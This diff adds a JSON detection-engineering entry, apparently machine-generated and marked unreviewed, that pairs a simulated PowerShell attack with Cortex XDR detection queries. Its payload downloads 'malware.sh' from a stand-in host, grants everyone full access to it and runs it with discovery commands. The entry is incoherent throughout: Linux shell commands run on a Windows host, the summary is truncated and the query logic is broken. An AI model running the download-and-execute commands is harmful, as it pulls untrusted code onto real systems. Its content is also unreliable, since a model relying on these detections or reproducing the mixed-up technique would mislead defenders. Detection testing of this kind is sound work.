@@ -1,0 +1,194 @@
+{
+  "id": "TTP-0000-0123",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-windows",
+      "endpoint",
+      "cortex-analytics-alert"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "windows"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Windows EDR Mimicking Linux Discovery Commands via PowerShell",
+    "summary": "An attacker uses PowerShell to execute multiple discovery commands on a Linux host, mimicking legitimate reconnaissance behavior. Cortex should detect this as suspicious process activity originating f",
+    "description": "An attacker uses PowerShell to execute multiple discovery commands on a Linux host, mimicking legitimate reconnaissance behavior. Cortex should detect this as suspicious process activity originating from a Windows endpoint."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1059",
+        "subtechnique_id": "T1059.001",
+        "name": "Command and Scripting Interpreter: PowerShell",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ]
+      },
+      {
+        "technique_id": "T1082",
+        "name": "System Information Discovery",
+        "tactic_ids": [
+          "TA0007"
+        ],
+        "tactic_names": [
+          "Discovery"
+        ]
+      },
+      {
+        "technique_id": "T1046",
+        "name": "Network Service Discovery",
+        "tactic_ids": [
+          "TA0007"
+        ],
+        "tactic_names": [
+          "Discovery"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "windows",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "administrator",
+    "payload": {
+      "interpreter": "powershell",
+      "code": "powershell -Command \"Invoke-WebRequest -Uri 'http://192.0.2.100/malware.sh' -OutFile 'C:\\\\temp\\\\malware.sh'\"\n powershell -Command \"icacls C:\\\\temp\\\\malware.sh /grant Everyone:F\"\n powershell -Command \"Start-Process -FilePath 'C:\\\\temp\\\\malware.sh' -ArgumentList '-c \"whoami;hostname;ls -la\"'\"\n powershell -Command \"Start-Process -FilePath 'C:\\\\temp\\\\malware.sh' -ArgumentList '-c \"ps aux;netstat -an;df -h\"'\"",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "PowerShell process executing download command",
+        "expected_value": "action_process_image_name = 'powershell.exe'"
+      },
+      {
+        "artifact_type": "file",
+        "description": "Downloaded script file",
+        "expected_value": "action_file_path = 'C:\\\\temp\\\\malware.sh'"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Outbound connection to C2 server",
+        "expected_value": "action_remote_ip = '192.0.2.100'"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "Multiple Discovery Commands by Same Process",
+        "description": "Detection of multiple discovery commands executed by the same PowerShell process",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'powershell.exe'\n| filter action_process_image_name = 'powershell.exe'\n| comp count() as cnt by causality_actor_process_image_name\n| comp count(action_process_image_name) as cmd_count\n| filter cmd_count > 1",
+        "mitre_technique_ids": [
+          "T1059.001",
+          "T1082",
+          "T1046"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "Windows PowerShell Executing Linux Discovery Commands",
+        "description": "Behavioral deviation where a Windows PowerShell process initiates multiple Linux discovery commands",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'powershell.exe'\n| filter action_process_image_name = 'powershell.exe'\n| filter action_file_path contains 'malware.sh'\n| filter action_process_command_line contains 'whoami;hostname;ls -la'\n| filter action_process_command_line contains 'ps aux;netstat -an;df -h'",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "actor_process_image_name = 'powershell.exe'",
+        "mitre_technique_ids": [
+          "T1059.001",
+          "T1082",
+          "T1046"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Hunt for PowerShell with Multiple Discovery Commands",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'powershell.exe'\n| filter action_process_command_line contains 'whoami;hostname;ls -la'\n| filter action_process_command_line contains 'ps aux;netstat -an;df -h'\n| comp count() as cnt by causality_actor_process_image_name\n| comp count(action_process_command_line) as discovery_cmd_count\n| filter discovery_cmd_count > 1",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — Multiple discovery commands on a Linux host by the same process; Required Data: XDR Agent. Ref: https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/multiple-discovery-commands-on-a-linux-host-by-the-same-process"
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex XDR Analytics Alert Reference: Multiple discovery commands on a Linux host by the same process",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/multiple-discovery-commands-on-a-linux-host-by-the-same-process",
+      "publisher": "Palo Alto Networks",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1059.001",
+      "url": "https://attack.mitre.org/techniques/T1059/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1082",
+      "url": "https://attack.mitre.org/techniques/T1082/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1046",
+      "url": "https://attack.mitre.org/techniques/T1046/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
